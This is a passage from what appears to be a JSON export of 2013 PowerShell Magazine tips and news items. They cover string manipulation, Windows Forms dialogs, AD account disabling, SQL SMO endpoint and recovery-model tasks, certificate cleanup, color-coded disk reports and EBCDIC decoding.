syntax defines how a task should be performed while declarative syntax describes what needs to be done.\nThis article is not about DSC feature itself but the programming style used to implement DSC. In the future articles, we will describe DSC more in-depth and understand how to use it. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/05/imperative-versus-declarative-syntax-in-powershell/","tags":["PowerShell DSC"],"title":"Imperative versus declarative syntax in PowerShell"},{"categories":["Tips and Tricks"],"contents":"How do you turn ‘20130701’ to ‘2013-07-01’?\nThere are many ways to tackle this, breaking it into pieces (substring) and joining it back with a dash, use some regex fu to manipulate it, parse it as a DateTime and format it and so on. Here’s another way that uses the String.Insert method.\nThe Insert() method takes two arguments–the index position of the insertion and the string to insert.\nPS\u0026gt; \u0026quot;\u0026quot;.Insert.OverloadDefinitions string Insert(int startIndex, string value) In our example we need to add a dash after the year part which is the fourth character.\nPS\u0026gt; $s = '20130701' PS\u0026gt; $s = $s.Insert(4,'-') PS\u0026gt; $s 2013-0701 Now we can add the second dash right after the month/day part (depending on your culture):\nPS\u0026gt; $s = $s.Insert(7,'-') PS\u0026gt; $s 2013-07-01 Or we can insert the dashes in two consecutive method calls:\nPS\u0026gt; '20130701'.Insert(4,'-').Insert(7,'-') 2013-07-01 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/04/pstip-inserting-characters-at-a-specified-string-index-position/","tags":["Tips and Tricks"],"title":"#PSTip Inserting characters at a specified string index position"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 4.0 or above.\nPowerShell enables you to refer to a property of an object in a dynamic fashion:\nPS\u0026gt; $proc = Get-Process -Id $PID PS\u0026gt; $property = 'Handles' PS\u0026gt; $proc.$property 485 PS\u0026gt; $property = 'Name' PS\u0026gt; $proc.$property powershell Trying the same approach with object methods failed with an error. Starting in Windows PowerShell 4.0 it is now possible to use a variable that holds the method name and dynamically invoke it:\n$fso = New-Object -ComObject Scripting.FileSystemObject Get-ChildItem | ForEach-Object { $method = if ($_.PSIsContainer) {'GetFolder'} else {'GetFile'} $fso.$method($_.FullName) } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/03/pstip-invoking-methods-by-using-dynamic-method-names/","tags":["Tips and Tricks"],"title":"#PSTip Invoking methods by using dynamic method names"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThe Disable-ADAccount cmdlet disables an Active Directory user, computer, or service account. When you need to disable multiple accounts you might find yourself trying something obvious like:\nPS\u0026gt; Disable-ADAccount -Identity user1,user2,user3  But that doesn’t work and yields an error. The Identity parameter doesn’t accept multiple values. The typical solution is to use the services of the ForEach-Object cmdlet and pass one account at a time:\necho user1 user2 user3 | ForEach-Object { Disable-ADAccount -Identity $_ }  Fortunately there’s a better and easy way to do that by simply piping the values directly to Disable-ADAccount. By default, Disable-ADAccount does not generate any output. Add the -PassThru switch if you want to see the modified object(s).\necho user1 user2 user3 | Disable-ADAccount -PassThru   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/02/pstip-disabling-multiple-ad-user-accounts/","tags":["Tips and Tricks"],"title":"#PSTip Disabling multiple AD user accounts"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn PowerShell, it is possible to use GUI elements to request user input. Although it is possible to create your own forms from scratch, there are also many useful pre-built dialogs available. In this tip, I will show you how to use the System.Windows.Forms.OpenFileDialog to select one or multiple files.\nThe following code will open a window that will prompt the user to select a single file. By setting the InitialDirectory property, the starting directory will be set to the current user’s desktop. This is done by using the [Environment] Desktop special folder:\nAdd-Type -AssemblyName System.Windows.Forms $FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = [Environment]::GetFolderPath('Desktop') } [void]$FileBrowser.ShowDialog() $FileBrowser.FileNames If documents need to be selected, it can be useful to set the starting folder to the documents folder. By setting a filter, we can ensure that only a certain type of file is selected. The next code sample will allow users to select .docx files. The filter can be changed by the user to also select an xlsx file:\nAdd-Type -AssemblyName System.Windows.Forms $FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ InitialDirectory = [Environment]::GetFolderPath('MyDocuments') Filter = 'Documents (*.docx)|*.docx|SpreadSheet (*.xlsx)|*.xlsx' } [void]$FileBrowser.ShowDialog() $FileBrowser.FileNames  To select multiple files the MultiSelect property should be set to True.\nAdd-Type -AssemblyName System.Windows.Forms $FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ Multiselect = $true } [void]$FileBrowser.ShowDialog() $FileBrowser.FileNames For more information about this class the following MSDN article can be used:\nhttp://msdn.microsoft.com/en-us/library/system.windows.forms.openfiledialog.aspx\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/01/pstip-using-the-system-windows-forms-openfiledialog-class/","tags":["Tips and Tricks"],"title":"#PSTip Using the System.Windows.Forms.OpenFileDialog Class"},{"categories":["News"],"contents":"Interested in a free PowerShell course tailored especially for IT Professionals? Want to know more about PowerShell and how to use it? Keep Reading!\nJeffrey Snover, the inventor of PowerShell, together with Jason Helmick, Senior Technologist at Concentrated Technology, will be delivering a one-day, hands-on Jump Start designed to teach the busy IT Professionals about this powerful management tool.\nYou’ll learn how PowerShell works and how to make PowerShell work for you—and you’ll learn it from the experts! Register for free and learn how to improve your management capabilities, automate redundant tasks and manage your environment in scale.\nMore details HERE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/07/01/getting-started-with-powershell-3-0/","tags":["News"],"title":"Getting Started with PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn PowerShell, it is possible to use GUI elements to allow for user input during scripts. Although it is possible to create your own forms from scratch, there are also many useful pre-built dialogs available. In this tip, we will see how the System.Windows.Forms.FolderBrowserDialog can be used to select a folder or path that can be used within a script.\nOn the first line we add the System.Forms class. This is to ensure the assembly is loaded. The New-Object Cmdlet creates the actual form and ShowDialog() Method on the object invokes the folder browser dialog.\nAdd-Type -AssemblyName System.Windows.Forms $FolderBrowser = New-Object System.Windows.Forms.FolderBrowserDialog [void]$FolderBrowser.ShowDialog() $FolderBrowser.SelectedPath  It is also possible to specify in which folder the folder browser starts. By default this is the user’s desktop but this can be changed by modifying the SelectedPath property:\nAdd-Type -AssemblyName System.Windows.Forms $FolderBrowser = New-Object System.Windows.Forms.FolderBrowserDialog -Property @{ SelectedPath = 'C:\\Temp’ } [void]$FolderBrowser.ShowDialog() $FolderBrowser.SelectedPath To limit the folders the RootFolder property can be utilized, it should be noted that only special folders can be entered here, a folder of the [System.Environment+SpecialFolder] type. This means a custom path cannot be entered here. In the next code sample I have also disable the New Folder property, this is to ensure a user cannot create a folder and then select that folder:\nAdd-Type -AssemblyName System.Windows.Forms $FolderBrowser = New-Object System.Windows.Forms.FolderBrowserDialog -Property @{ RootFolder = 'MyDocuments' ShowNewFolderButton = $false } [void]$FolderBrowser.ShowDialog() $FolderBrowser.SelectedPath To get a full list of the available special folders the [enum] accelerator can be used to enumerate these folders. This code will generate list of the available values for the RootFolder property:\n[Enum]::GetNames([System.Environment+SpecialFolder])  To learn more about this class or the values in the RootFolder property the following two MSDN articles can be used:\nhttp://msdn.microsoft.com/en-us/library/system.windows.forms.folderbrowserdialog.aspx\nhttp://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.95).aspx\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/28/pstip-using-the-system-windows-forms-folderbrowserdialog-class/","tags":["Tips and Tricks"],"title":"#PSTip: Using the System.Windows.Forms.FolderBrowserDialog Class"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nRecently a question was posted on the PowerShell.com forums: How to get a full list of available ComObjects? This tip will show how fetch all of them from the registry.\nHere is the code that we can use to generate this list:\nGet-ChildItem HKLM:\\Software\\Classes -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -match '^\\w+\\.\\w+$' -and (Test-Path -Path \"$($_.PSPath)\\CLSID\") } | Select-Object -ExpandProperty PSChildName  The first Cmdlet reads out a complete list of values from HKLM:\\Software\\Classes and then verifies if the following two conditions are true:\n Does the object match the naming convention for a ComObject? Does the registry key have a CLSID folder? Every registered ComObject should have a CLSID as a unique identifier.  An example of the output generated by this command is as follows:\nAccClientDocMgr.AccClientDocMgr AccDictionary.AccDictionary Access.ACCDAExtension Access.ACCDCFile Access.ACCDEFile Access.ACCDTFile Access.ACCFTFile Access.ADEFile  To make the process of discovering ComObject easier the following function can be used.\nfunction Get-ComObject { param( [Parameter(Mandatory=$true, ParameterSetName='FilterByName')] [string]$Filter, [Parameter(Mandatory=$true, ParameterSetName='ListAllComObjects')] [switch]$ListAll ) $ListofObjects = Get-ChildItem HKLM:\\Software\\Classes -ErrorAction SilentlyContinue | Where-Object { $_.PSChildName -match '^\\w+\\.\\w+$' -and (Test-Path -Path \u0026quot;$($_.PSPath)\\CLSID\u0026quot;) } | Select-Object -ExpandProperty PSChildName if ($Filter) { $ListofObjects | Where-Object {$_ -like $Filter} } else { $ListofObjects } }  This function is available in the TechNet Script Gallery:\nhttp://gallery.technet.microsoft.com/Get-ComObject-Function-to-50a92047\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/27/pstip-get-a-list-of-all-com-objects-available/","tags":["Tips and Tricks"],"title":"#PSTip Get a list of all Com objects available"},{"categories":["News"],"contents":"Microsoft announced that the Windows Management Framework (WMF) 4.0 preview is available for download on Microsoft download center.\nWindows Management Framework (WMF) 4.0 Preview contains updated functionality available for installation on Windows 7 with Service Pack 1 (SP1), Windows Server 2008 R2 with SP1, and Windows Server 2012. WMF 4.0 Preview contains updated version of the following features:\n Windows PowerShell Windows PowerShell ISE Windows PowerShell Web Services (Management OData IIS Extension) Windows Remote Management (WinRM) Windows Management Infrastructure (WMI)  Make a note that this preview release cannot be installed on systems with Windows 8.\nDon’t forget to check the release notes before you install this update. Also, there is a guide available for understanding and using Desired State Configuration (DSC). These documents are a part of WMF 4.0 download package.\nThis updated PowerShell 4.0 and other WMF 4.0 functionality is available in Windows Server 2012 R2 preview too.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/26/windows-management-framework-4-0-preview-download-is-available/","tags":["News"],"title":"Windows Management Framework 4.0 Preview download is available"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nTo get more information about any object, class or attribute the MSDN library is often a good resource. Using Start-Process we can accelerate this process:\nStart-Process -FilePath \"http://social.msdn.microsoft.com/Search/en-US?query=Excel.Application\"  To automate this further, we can wrap this in a function.\nFunction Search-Msdn { param( [Parameter(Mandatory=$true)] [string[]]$SearchQuery, [System.Globalization.Cultureinfo]$Culture = 'en-US' ) foreach ($Query in $SearchQuery) { Start-Process -FilePath \u0026quot;http://social.msdn.microsoft.com/Search/$($Culture.Name)?query=$Query\u0026quot; } } Whenever you require more information on an object, object property or .Net class, this function will open the MSDN site displaying the search results for the query that has been entered. The full version of this function will be maintained in the Technet Script Gallery:\nhttp://gallery.technet.microsoft.com/Search-Msdn-a-function-eafee2bb\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/26/pstip-query-msdn-from-powershell/","tags":["Tips and Tricks"],"title":"# PSTip Query MSDN from PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThe next time you are working in a folder and need to open a Windows PowerShell console directly to that location, it would be nice to have ‘Open Windows PowerShell Here as Administrator’ option on a context menu. To accomplish that, you’ll need to create a few Registry keys, and an elevated Windows PowerShell console will be just a right-click away from a folder icon, a drive icon, or inside of an open folder. To run this code, start Windows PowerShell with the “Run as administrator” option.\n$menu = 'Open Windows PowerShell Here as Administrator' $command = \u0026quot;$PSHOME\\powershell.exe -NoExit -NoProfile -Command \u0026quot;\u0026quot;Set-Location '%V'\u0026quot;\u0026quot;\u0026quot; 'directory', 'directory\\background', 'drive' | ForEach-Object { New-Item -Path \u0026quot;Registry::HKEY_CLASSES_ROOT\\$_\\shell\u0026quot; -Name runas\\command -Force | Set-ItemProperty -Name '(default)' -Value $command -PassThru | Set-ItemProperty -Path {$_.PSParentPath} -Name '(default)' -Value $menu -PassThru | Set-ItemProperty -Name HasLUAShield -Value '' } This is how the modified HKEY_CLASSES_ROOT\\Directory\\shell and HKEY_CLASSES_ROOT\\Directory\\Background\\shell Registry keys look like (click for larger image):\nThese Registry changes will create new entry on the context menu and this is how it looks when you right-click a folder icon, or inside of the open folder:\nContext menu when you right-click a folder icon\nContext menu when you right-click inside (on the background) of an open folder\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/25/pstip-how-to-start-an-elevated-powershell-from-windows-explorer/","tags":["Tips and Tricks"],"title":"#PSTip How to start an elevated PowerShell from Windows Explorer"},{"categories":["News"],"contents":"“Windows PowerShell 4.0 includes several significant features that extend its use, improve its usability, and allow you to control and manage Windows-based environments more easily and comprehensively.”\nFind out what’s new in the new upcoming release of Windows PowerShell at this Technet page.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/25/new-features-in-windows-powershell-4-0/","tags":["News"],"title":"New Features in Windows PowerShell 4.0"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nDatabase mirroring requires that the database be in Full recovery model as a prerequisite to configure mirroring. In this post, we shall see how we can retrieve the recovery model setting for a database and then set it to Full recovery model, as required.\nWe can get the recovery model setting of a given SQL database by looking at the Database object properties.\nAdd-Type -AssemblyName \"Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" Add-Type -AssemblyName \"Microsoft.SqlServer.ConnectionInfo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\" $conn = New-Object Microsoft.SqlServer.Management.Common.ServerConnection -ArgumentList $env:ComputerName $conn.applicationName = \"PowerShell SMO\" $conn.ServerInstance = \".\\SQLEXPRESS\" $conn.StatementTimeout = 0 $conn.Connect() $smo = New-Object Microsoft.SqlServer.Management.Smo.Server -ArgumentList $conn $smo.Databases[\"MyDB\"] | Select Name, RecoveryModel  This property can be modified to set a database to Full recovery model. Assuming that MyDB is in Simple recovery model, we can change the property.\n$smo.Databases[\"MyDB\"].RecoveryModel = \"Full\" $smo.Databases[\"MyDB\"].Alter()   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/24/pstip-change-database-recovery-model-using-smo/","tags":["SQL","Tips and Tricks"],"title":"#PSTip Change database recovery model using SMO"},{"categories":["How To"],"contents":"In the PowerShell community, there is some debate about the usage of the Write-Host cmdlet. The debate stems from the fact that the output of the Write-Host cmdlet places strings of text on the monitor and not in the pipeline. Since PowerShell cmdlets are supposed to create objects some may think you are developing poor code should you be caught using Write-Host. I personally beg to differ. Although nicely formatted columns can present data in a very orderly package, too much displayed information can hide what is requiring the user’s attention. This is where the Write-Host cmdlet can excel. For the novice user, the color formatting capabilities of the Write-Host cmdlet can be used to highlight what needs their attention and focuses them on the task at hand.\nRecently I presented a project to the Cincinnati PowerShell User Group to provide help desk technicians with many of the answers to the questions that they would not want to ask the end user. Let’s face it–either the user does not know the answer, does not want to tell you the truth, or it might be too time-consuming to manually extrapolate the data from an RDP session. The problem here is that many help desk technicians are not PowerShell savvy. You need to be aware of the consumers of your code and present information in a way that meets their needs.\nIn the case of the help desk, we can provide cmdlets to help extract information quickly from a remote client. We can then have PowerShell flag values that would be considered out of an acceptable range. This approach would allow the PowerShell-challenged staff to focus on what is requiring their attention without filtering cmdlet output. The code below is an example of how to extract a client’s hard disk free space. This simple example will demonstrate using color to flag potential problems.\nFunction Get-DiskInfo { Param( $ComputerName = $env:COMPUTERNAME, [Switch]$PassThru ) Function Get-ColorSplat { # Create color Splats $C1 = @{ForegroundColor=\u0026quot;Green\u0026quot;;BackgroundColor=\u0026quot;DarkGreen\u0026quot;} $C2 = @{ForegroundColor=\u0026quot;Yellow\u0026quot;;BackgroundColor=\u0026quot;DarkYellow\u0026quot;} $C3 = @{ForegroundColor=\u0026quot;White\u0026quot;;BackgroundColor=\u0026quot;DarkRed\u0026quot;} $C4 = @{ForegroundColor=\u0026quot;Blue\u0026quot;;BackgroundColor=\u0026quot;Gray\u0026quot;} # Create color constants in the previous scope. New-Variable -Name \u0026quot;Good\u0026quot; -Value $C1 -Scope 1 New-Variable -Name \u0026quot;Problem\u0026quot; -Value $C2 -Scope 1 New-Variable -Name \u0026quot;Bad\u0026quot; -Value $C3 -Scope 1 New-Variable -Name \u0026quot;Header\u0026quot; -Value $C4 -Scope 1 } # End: Get-ColorSplat Function Write-ColorOutput { Param($DiskInfo) # Display the headers. Write-host \u0026quot;DiskInfo | FreeSpaceGB | PercentFreeSpace\u0026quot; # Display the data. ForEach ($D in $DiskInfo) { $DeviceID = $D.DeviceID.PadRight(6) $FSGB = $D.FreeSpaceGB.ToString().PadRight(6).Remove(5) $PFS = $D.PercentFS.ToString().PadRight(6).Remove(5) If ($D.PercentFS -ge 80) { Write-Host \u0026quot;$($DeviceID) | $($FSGB) | $($PFS)\u0026quot; @Good } ElseIf (($D.PercentFS -lt 80) -and ($D.PercentFS -GE 60)) { Write-Host \u0026quot;$($DeviceID) | $($FSGB) | $($PFS)\u0026quot; @Problem } Else { Write-Host \u0026quot;$($DeviceID) | $($FSGB) | $($PFS)\u0026quot; @Bad } } } # Get the color splats Get-ColorSplat $DiskInfo = Get-WmiObject Win32_LogicalDisk -ComputerName $ComputerName | Select-Object -Property DeviceID, @{Name=\u0026quot;FreeSpaceGB\u0026quot;;Expression={$_.Freespace/1GB}}, @{Name=\u0026quot;PercentFS\u0026quot;;Expression={($_.FreeSpace/$_.Size)*100}} If (!$PassThru) {Write-ColorOutput -DiskInfo $DiskInfo} Else {Write-Output $DiskInfo} }  This cmdlet has a switch parameter that I want to bring to your attention, –PassThru. Since this code is intended for users who are not avid PowerShell users, the default behaviour is to display the color-coded information. The usage of the -PassThru parameter suppresses the use of Write-Host and allow an object to be passed to the pipeline. In this case, we have object in, object out. By doing this we have the capability of continuing to pass our object into the pipeline. Here are some examples:\nIn this example we see the default output of color-coded information drawing the technician to the drives that need attention.\nPS\u0026gt; Get-DiskInfo -ComputerName JasonPC2 -PassThru | Format-Table -AutoSize DeviceID FreeSpaceGB PercentFS -------- ----------- --------- C: 34.6056213378906 31.7261065852248 D: 202.438598632813 84.9355612944946 E: 79.9115943908691 33.5278754613268 Z: 83.1089553833008 8.95466512825099 In this example, the –PassThru parameter is utilized and we are once again working with objects. The best of both worlds is possible. Remember to always consider the audience of your code and display information to them that is relevant and fits their skill level.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/20/an-example-when-using-write-host-makes-sense/","tags":["How To"],"title":"An example when using Write-Host makes sense"},{"categories":["Tips and Tricks"],"contents":"We use a lot of certificates for website authentication, and they expire each year. Some people end up with a collection of expired certificates. That makes it hard to find the right one when presented with the list of certificates in Internet Explorer.\nTo work with the certificates we use the X.509 Certificate Provider (Microsoft.PowerShell.Security\\Certificate). This provider in PowerShell 2.0 requires jumping through a few manual hoops to clean up the environment. We need to work with the System.Security.Cryptography.X509Certificates.X509Store object associated with the store and grab that with Get-Item:\n$myCerts = Get-Item Cert:\\CurrentUser\\My  To delete the certificates we have to open the $myCerts X.509 Store object passing an OpenFlags enumeration. The Open() method can create a new store or set what access is given to the given store based on the OpenFlags. By default the store is read-only and you cannot remove the certificate without opening it.\n   Member name Description     IncludeArchived Open the X.509 certificate store and include archived certificates.   MaxAllowed Open the X.509 certificate store for the highest access allowed.   OpenExistingOnly Opens only existing stores; if no store exists, the Open method will not create a new store.   ReadOnly Open the X.509 certificate store for reading only.   ReadWrite Open the X.509 certificate store for both reading and writing.    $myCerts.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)  To get the list of expired certificates we need to filter the child items that are not valid after yesterday. $myCerts is already pointing to the path we need, so we can use it as a reference rather than repeating a hard coded string.\n$today = Get-Date $ExpiredList = Get-ChildItem $myCerts.PSPath | Where-Object { $_.NotAfter -lt $today }  There is a reason we set _$toda_y before the pipeline, Get-Date does work, we don’t want to call if for every iteration of the Where-Object cmdlet as we don’t need the refined difference between each call.\nRemove each certificate in the X.509 certificate store that was returned from our query:\nForEach ($Cert in $ExpiredList) { $myCerts.Remove($Cert) } $myCerts.Close() # We opened it, so we need to close it. In PowerShell 3.0 the entire thing can be done:\n$today = Get-Date Get-ChildItem Cert:\\CurrentUser\\My | Where-Object NotAfter -lt $today | Remove-Item #or Get-ChildItem Cert:\\CurrentUser\\My | ForEach-Object -begin { $now = get-date } -process { if ($PSItem.NotAfter -lt $now ) { $PSItem } } | Remove-Item ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/19/pstip-deleting-expired-certificates-from-the-personal-certificate-store/","tags":["Tips and Tricks"],"title":"#PSTip Deleting expired certificates from the personal certificate store"},{"categories":["Tips and Tricks"],"contents":"Excel can be used to view HTML. If you add some CSS styles to the result of ConvertTo-HTML you can add much more rich output to Excel then you would get with a simple Export-Csv\n$HTMLFile = Join-Path $Home \u0026quot;Processes.html\u0026quot; $HTML = Get-Process | Select-Object CPU, ID, ProcessName | ConvertTo-HTML # Reference for color names http://www.w3schools.com/cssref/css_colornames.asp $HTML = $HTML -replace '^[\u0026lt;]tr[\u0026gt;][\u0026lt;]td[\u0026gt;][\u0026lt;][/]td[\u0026gt;]','\u0026lt;tr style=\u0026quot;color:red\u0026quot; \u0026gt;\u0026lt;td\u0026gt;\u0026lt;/td\u0026gt;' # Highlight anything that has Chrome or Google In the Name $HTML = $HTML -replace '[\u0026lt;]td(?\u0026lt;T\u0026gt;[\u0026gt;]((chrome)|(Google[^\u0026lt;]*))[\u0026lt;][/]td[\u0026gt;])','\u0026lt;td style=\u0026quot;background:blue;color:Yellow\u0026quot; ${T}' $HTML | Out-File $HTMLFile #Find a good version of Excel.exe $Excel = Resolve-Path \u0026quot;C:\\Program Files*\\Microsoft Office\\Office*\\EXCEL.EXE\u0026quot; | Select-Object -First 1 -ExpandProperty Path \u0026amp; $Excel $HTMLFile ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/17/pstip-use-excel-to-view-html-output/","tags":["Tips and Tricks"],"title":"#PSTip Use Excel to View HTML Output"},{"categories":["How To"],"contents":"The -Encoding parameter in many native I/O cmdlets uses the [Microsoft.PowerShell.Commands.FileSystemCmdletProviderEncoding] enum.\nPS\u0026gt; [System.Enum]::GetNames([Microsoft.PowerShell.Commands.FileSystemCmdletProviderEncoding]) Unknown String Unicode Byte BigEndianUnicode UTF8 UTF7 UTF32 Ascii Default Oem  Files that come from an IBM mainframe such as the AS/400 are often exported to ASCII or Unicode when a PC is the intended consumer. Sometimes, however, we need to be able to work with these files that are formatted in IBM’s native EBCDIC encoding. “Extended Binary Coded Decimal Interchange Code (EBCDIC)” is an 8-bit character encoding that is extended from the 6-bit encoding used on punch cards. See http://en.wikipedia.org/wiki/EBCDIC for more detail. Fortunately the .NET Framework provides about 140 native encoding types.\nTo get the list run [System.Text.Encoding]::GetEncodings(). Many of the items in the [FileSystemCmdletProviderEncoding] enum are included in this list. You may also notice that about 35 of these encodings contain either IBM or EBCDIC in their DisplayName. The most common or generic of the EBCDIC formats are under the IBM037 name.\nAn example content of an EBCDIC file opened in Notepad looks like this; not that readable:\nTo read the data and use the native commands, we can load the file as bytes then convert those bytes to a .NET string that we can work with.\n$Buffer = Get-Content $SourceFileName -Encoding byte $Encoding = [System.Text.Encoding]::GetEncoding(\"IBM037\") $String = $Encoding.GetString($Buffer)  Magically the $String variable now contains text we can read. Now another interesting thing about some IBM data files is that they are character length-specific data fields, and do not necessarily contain any EOL (End-Of-Line) characters. Depending on the type of file you are looking at, you may have a NEL (NExt-Line 0x15) character mark; if so, the Encoding class should have resolved that for you.\nIf you didn’t and you don’t want to play all day with line wrap in your editor, then we need to insert `n. A regular expression using the all-encompassing “.” and a set length will easily give us the field records that we need. They can then be left in an array or joined back together again with `n.\nMost line default records should be 80 characters long from punch card legacies, but in the financial analysis file that I used 107 characters were used to define the line records.\nFunction Decode-EBCDIC { Param ( [io.fileinfo]$SourceFileName, [int]$LineLength = -1, $Encoding = \u0026quot;IBM037\u0026quot; ) #Based on http://www.codeproject.com/Articles/31720/How-to-Read-an-EBCDIC-File-in-VB-NET $Buffer = Get-Content $SourceFileName -encoding byte $Encoding = [System.Text.Encoding]::GetEncoding(\u0026quot;IBM037\u0026quot;) $String = $Encoding.GetString($Buffer) if ($LineLength -gt 1) { $Regex = [regex]\u0026quot;.{$LineLength}\u0026quot; $OutString = ($Regex.Matches($String) | Select-Object -ExpandProperty Value) -join \u0026quot;`r`n\u0026quot; # Join won't add a CR at the end of the string, so we manually append it. $OutString += \u0026quot;`r`n\u0026quot; } else { $OutString = $String } $OutString } PS\u0026gt; Decode-EBCDIC .\\EBCDIC_wiki.txt http://en.wikipedia.org/wiki/EBCDIC#History EBCDIC /'?bs?d?k/ was devised in 1963 and 1964 by IBM and was announced with the release of the IBM System/360 line of mainframe computers. It is an 8-bit character encoding, in contrast to, and developed separately from, the 7-bit ASCII encoding scheme. It was created to extend the existing binary-coded decimal (BCD) interchange code, or BCDIC, which itself was devised as an efficient means of encoding the two zone and number punches on punched cards into 6 bits. (…) PS\u0026gt; Decode-EBCDIC .\\EBCDIC_wiki_noNEL.txt -LineLength 79 http://en.wikipedia.org/wiki/EBCDIC#History EBCDIC /'?bs?d?k/ was devised in 1963 and 1964 by IBM and was announced with the release of the IBM System/360 line of mainframe computers. It is an 8-bit character encoding, in contrast to, and developed separately from, the 7-bit ASCII encoding scheme. It was created to extend the existing binary-coded decimal (BCD) interchange code, or BCDIC, which itself was devised as an efficient means of encoding the two zone and number punches on punched cards into 6 bits. (…)  Sample file: EBCDIC_wiki_noNEL, EBCDIC_wiki\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/17/working-with-non-native-powershell-encoding-ebcdic/","tags":["How To"],"title":"Working with non-native PowerShell encoding (EBCDIC)"},{"categories":["PowerShell DSC"],"contents":"I am sure you all must have already looked at the Desired State Configuration (DSC) feature announcement by Jeffrey Snover and Kenneth Hansen at TechEd 2013. This exciting change is coming up in Windows Server 2012 R2 and with PowerShell version 4. But, none of these are available yet for a public preview.\nBut, we can’t wait to explore more on this, right?\nSo, here is a chance to get your hands on DSC. Microsoft released an online hands on lab for Desired State Configuration in Windows Server 2012. Go, explore!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/12/desired-state-configuration-in-windows-server-2012-r2-online-hands-on-lab/","tags":["PowerShell DSC"],"title":"Desired State Configuration in Windows Server 2012 R2 – Online hands on lab"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn earlier tips, we looked at how we can get all SQL endpoints, check if a SQL endpoint exists or not, and creating SQL mirroring endpoints. In this tip, we will see how we can delete the existing SQL endpoints.\nFunction Remove-SQLEndPoint { [CmdletBinding()] param ( [string]$computername=$env:COMPUTERNAME, [string]$instancename, [string]$endpointname ) Begin { Write-Verbose \u0026quot;Loading SQL SMO\u0026quot; Add-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; Add-Type -AssemblyName \u0026quot;Microsoft.SqlServer.ConnectionInfo, Version=11.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; } Process { try { $connection = New-Object Microsoft.SqlServer.Management.Common.ServerConnection -ArgumentList $ComputerName $connection.applicationName = \u0026quot;PowerShell SQL SMO\u0026quot; if ($instancename) { Write-Verbose \u0026quot;Connecting to SQL named instance\u0026quot; $connection.ServerInstance = \u0026quot;${env:computername}\\${instancename}\u0026quot; } else { Write-Verbose \u0026quot;Connecting to default SQL instance\u0026quot; } $connection.StatementTimeout = 0 $connection.Connect() $smo = New-Object Microsoft.SqlServer.Management.Smo.Server -ArgumentList $connection } catch { Write-Error $_ } try { if ($smo.Endpoints[$endpointname]) { Write-Verbose \u0026quot;Dropping the endpoint ${endpointname}\u0026quot; $smo.Endpoints[$endpointname].Drop() } else { Write-Error \u0026quot;No end point exists with the name ${endpointname}\u0026quot; } } catch { Write-Error $_ } } }  For the purpose of removing the endpoints, we use the Drop() method of the Endpoint class. For error handling purpose, we check if the given endpoint name exists within all existing endpoints on the SQL server.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/06/11/pstip-deleting-a-sql-mirroring-endpoint-in-smo-and-powershell/","tags":["SQL","Tips and Tricks"],"title":"#PSTip Deleting a SQL mirroring endpoint with SMO and PowerShell"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn today’s tip, we will see how we can use PowerShell and SMO to create a SQL TCP mirroring endpoint. We can use the [Create()][1] method of [Microsoft.SqlServer.Management.Smo.Endpoint][2] class to create an endpoint. In the following function, I used the code we published in [earlier tips][3] to verify whether an endpoint exists or not. So, to be able to use this function, you need the [Get-SQLEndpoint][4] function from an earlier tip.\nFunction New-SQLMirroringTCPEndpoint { [CmdletBinding()] param ( 